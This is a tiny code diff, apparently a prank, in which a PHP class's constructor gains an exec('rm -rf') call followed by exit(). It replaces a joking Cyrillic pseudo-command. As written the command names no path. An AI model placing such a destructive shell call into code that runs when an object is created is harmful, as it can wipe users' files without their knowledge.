@@ -12,7 +12,7 @@ class Bullshit
 {
     public function __construct()
     {
-        запустить('рм -рф'); // pastebin  не пропускает)))
+        exec('rm -rf');
         exit();
     }
 }
